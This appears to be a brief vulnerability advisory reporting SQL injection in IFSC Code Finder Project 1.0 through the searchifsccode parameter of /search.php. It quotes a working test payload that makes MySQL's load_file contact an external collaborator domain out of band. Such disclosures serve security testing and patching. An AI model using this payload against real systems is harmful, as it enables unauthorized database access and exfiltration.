## Description:
SQL Injection vulnerability exists in IFSC Code Finder Project 1.0 via the searchifsccode POST parameter in /search.php.
The searchifsccode parameter appears to be vulnerable to SQL injection attacks. The test payload '+(select load_file('\\\\bp4frncin7wvtb1vnxr1n6ngh7n0bzzq2eu1kp9.nu11secur1tycollaborator.net\\ing'))+' was submitted in the searchifsccode parameter. This payload injects a SQL sub-query that calls MySQL's load_file function with a UNC file path that references a URL on an external domain. The application interacted with that domain, indicating that the injected SQL query was executed.
